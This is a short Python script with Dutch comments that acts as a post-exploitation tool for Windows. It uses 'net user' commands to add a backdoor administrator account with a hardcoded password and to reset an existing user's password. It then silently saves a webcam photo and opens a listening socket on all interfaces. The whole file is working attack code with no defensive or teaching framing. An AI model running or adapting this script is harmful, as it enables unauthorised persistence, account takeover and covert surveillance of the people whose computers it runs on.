import os
import subprocess
import pyautogui
import time
import cv2
import socket

# --- Functie om een nieuwe gebruiker aan te maken en adminrechten te geven ---
def create_admin_user(new_user, password):
    try:
        # Voor Windows:
        subprocess.run(['net', 'user', new_user, password, '/add'], check=True)
        subprocess.run(['net', 'localgroup', 'administrators', new_user, '/add'], check=True)
        print(f"[+] Gebruiker '{new_user}' aangemaakt met adminrechten.")
    except Exception as e:
        print(f"[-] Fout bij aanmaken gebruiker: {e}")

# --- Functie om het wachtwoord van een bestaande gebruiker te wijzigen ---
def change_password(username, new_password):
    try:
        # Voor Windows:
        subprocess.run(['net', 'user', username, new_password], check=True)
        print(f"[+] Wachtwoord van '{username}' gewijzigd naar '{new_password}'.")
    except Exception as e:
        print(f"[-] Fout bij wachtwoord wijzigen: {e}")

# --- Functie om webcamtoegang te testen ---
def check_webcam():
    try:
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            print("[+] Webcam toegankelijk.")
            ret, frame = cap.read()
            if ret:
                cv2.imwrite("webcam_test.jpg", frame)
                print("[+] Webcamfoto opgeslagen als 'webcam_test.jpg'.")
            cap.release()
        else:
            print("[-] Geen toegang tot webcam.")
    except Exception as e:
        print(f"[-] Webcamfout: {e}")

# --- Eenvoudige Chatbox (Lokaal / Socket) ---
def start_chat_server(port=12345):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(('0.0.0.0', port))
        server.listen(1)
        print(f"[+] Chat-server luistert op poort {port}.")
        conn, addr = server.accept()
        print(f"[+] Verbonden met {addr}.")
        while True:
            data = conn.recv(1024).decode()
            if not data:
                break
            print(f"Bericht ontvangen: {data}")
            reply = input("Antwoord: ")
            conn.send(reply.encode())
    except Exception as e:
        print(f"[-] Chatfout: {e}")

# --- Hoofdscript ---
if __name__ == "__main__":
    # Configuratie
    TARGET_USER = "Gast"  # Bestaande gebruiker
    NEW_USER = "Admin123"
    NEW_PASSWORD = "pinda123"

    # 1. Maak een nieuwe admin-gebruiker aan
    create_admin_user(NEW_USER, NEW_PASSWORD)

    # 2. Wijzig het wachtwoord van de hoofdaccount
    change_password(TARGET_USER, NEW_PASSWORD)

    # 3. Controleer webcam
    check_webcam()

    # 4. Start een chatbox (lokaal)
    print("\n[+] Chatbox wordt gestart...")
    start_chat_server()